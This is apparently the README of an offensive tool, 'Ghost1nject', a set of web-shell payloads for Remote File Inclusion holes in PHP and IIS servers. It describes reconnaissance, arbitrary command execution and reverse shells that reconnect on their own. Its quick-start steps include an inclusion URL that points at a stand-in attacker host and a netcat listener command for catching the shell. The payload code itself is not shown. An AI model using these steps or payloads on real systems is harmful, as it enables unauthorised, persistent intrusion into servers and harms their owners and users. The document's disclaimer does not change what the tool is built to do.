# 👻 Ghost1nject – Persistent RFI Payloads

**Ghost1nject** is a collection of compact, persistent payloads for **Remote File Inclusion (RFI)** vulnerabilities.  
It provides target reconnaissance, command execution, and **auto‑reconnecting reverse shells** on multiple platforms.

| Version | Platform | Language | Persistence |
|---------|----------|----------|-------------|
| **Linux** | PHP (Apache/nginx) | PHP | ✅ Bash `/dev/tcp` → PHP socket, sleeps 10s |
| **Windows (PHP)** | XAMPP, Wamp, IIS+PHP | PHP | ✅ PHP socket → PowerShell, sleeps 10s |
| **Windows (IIS)** | IIS + .NET | ASPX (C#) | ✅ Background thread, sleeps 10s |

## 🎯 Features

- 📡 **Target reconnaissance** – OS, user, working directory, language version, server software, disabled functions.
- 💻 **Interactive command execution** – run any system command and see the output.
- 🔌 **Persistent reverse shell** – automatically reconnects every 10 seconds if the connection drops.
- 🛡️ **Error resilient** – fails gracefully; no output breaks the page.
- ⚡ **Async command runner** – commands execute without page reload (fetch API).
- 🔄 **Multi‑method fallbacks** – each version tries alternative techniques (Bash → PHP, PHP → PowerShell, etc.).
- 📦 **Compact** – all payloads under 3 KB, easy to include via RFI or file upload.

## 📁 Payloads

| File | Target | README |
|------|--------|--------|
| `linux/ghostinject.php` | Linux + PHP | [README_LINUX.md](linux/README_LINUX.md) |
| `windows_php/ghostinject_win.php` | Windows + PHP (XAMPP/IIS) | [README_WIN_PHP.md](windows_php/README_WIN_PHP.md) |
| `windows_iis/ghostinject.aspx` | Windows + IIS / .NET | [README_ASPX.md](windows_iis/README_ASPX.md) |

## 🚀 Quick Start

### 1. Upload / include the payload
Exploit an RFI vulnerability (e.g., `?page=http://attacker.com/ghostinject.php`) or upload the file directly.

### 2. Access the generated web interface
Open the payload URL in a browser.

### 3. Reconnaissance
System information is displayed automatically.

### 4. Run commands
Type any command (e.g., `whoami`, `id`, `ipconfig`) and click **Run**.

### 5. Get persistent reverse shell
- On your attacker machine: `nc -lvnp 4444`
- Fill the reverse shell form with your IP and port, click **Start Ghostinject**
- The payload will connect back and **reconnect automatically every 10 seconds** if the connection dies.

## ⚙️ Requirements per version

| Version | Required / Optional |
|---------|---------------------|
| **Linux PHP** | PHP 5.3+, `shell_exec`/`exec`, `fsockopen` (optional); Bash (`/bin/bash`) recommended |
| **Windows PHP** | PHP 5.3+, `shell_exec`/`exec`, `fsockopen`; PowerShell (fallback) |
| **Windows IIS** | .NET Framework 2.0+, ASP.NET support, outgoing TCP allowed |

## 🛡️ Legal Disclaimer

> **This software is provided for educational purposes and authorized security testing only.**  
> Unauthorized access to computer systems is illegal. The author assumes no liability for any misuse or damage caused by this software. Always obtain explicit written permission before testing any system.

## 📄 License

MIT License – see [LICENSE](LICENSE) file for details.

## 🤝 Contributing

Pull requests and suggestions are welcome – especially for additional fallback methods (Python, Perl, socat) without increasing payload size.

## ⭐ Show your support

If you find this tool useful, please star the repository and share responsibly.
